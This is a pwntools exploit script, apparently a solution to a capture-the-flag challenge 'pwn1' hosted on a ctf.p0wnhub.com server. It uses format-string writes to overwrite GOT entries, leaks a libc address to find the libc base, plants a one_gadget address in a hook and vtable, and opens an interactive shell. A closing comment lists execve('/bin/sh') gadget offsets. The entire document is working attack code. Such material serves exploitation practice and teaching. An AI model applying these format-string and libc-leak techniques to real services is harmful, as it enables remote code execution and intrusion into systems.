from pwn import *

#context.log_level = 'debug'

#p = process('./pwn1', env={'LD_PRELOAD':'./libc'})
p = remote('79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com', 11337)
e = ELF('./pwn1')
l = e.libc

offset = 8

pay = p64(e.got['exit'])
pay += 'a'*8
pay += '%4434c%8$hn'
p.send(pay)
p.recv()

pay = p64(e.got['read'])
pay += 'a'*8
pay += '%8$s'
p.send(pay)

#libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x110070 # local
libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x0ef350# remote
#hook = libc + l.sym['__malloc_hook']
magic = libc + 0xea36d
hook = libc + 0x3c2740
vtable = libc + 0x3c34d8

print hex(libc)
print hex(magic)

a = (magic & 0xffff00000000) >> 32
b = (magic & 0xffff0000) >> 16
c = magic & 0xffff

pay = p64(hook+2) + 'a'*8
pay += '%{}c'.format(b)+'%8$hn'
pay = pay.ljust(0x20, 'a')
p.send(pay)

pay = p64(hook)+'a'*8
pay += '%{}c'.format(c)+'%8$hn'
pay = pay.ljust(0x20, 'a')
p.send(pay)

pay = p64(hook+4)+'a'*8
pay += '%{}c'.format(a)+'%8$hn'
pay = pay.ljust(0x20, 'a')
p.send(pay)

z = hook & 0xffff
z -= 0x38

pay = p64(vtable)+'a'*8
pay += '%{}c'.format(z)+'%8$hn'
pay = pay.ljust(0x20, 'a')
p.send(pay)

p.interactive()

"""
0x46428 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4647c execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe9415 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xea36d execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
